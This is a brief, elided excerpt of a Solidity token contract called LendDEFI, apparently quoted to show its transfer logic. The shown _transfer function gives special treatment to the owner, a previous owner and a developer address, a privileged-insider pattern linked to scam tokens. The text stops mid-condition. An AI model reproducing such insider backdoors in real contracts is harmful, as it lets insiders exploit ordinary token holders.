...
contract LendDEFI is Context, IERC20, Ownable {
    ...
    uint256 private  _tTotal = 64000000 * 10**4;
    ...
    uint256 private _total = 64000000 * 10**4;
    ...
    function devaddress() public returns (address) {
        return _devaddress;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner() || sender == previousowner() || sender==devaddress()) {
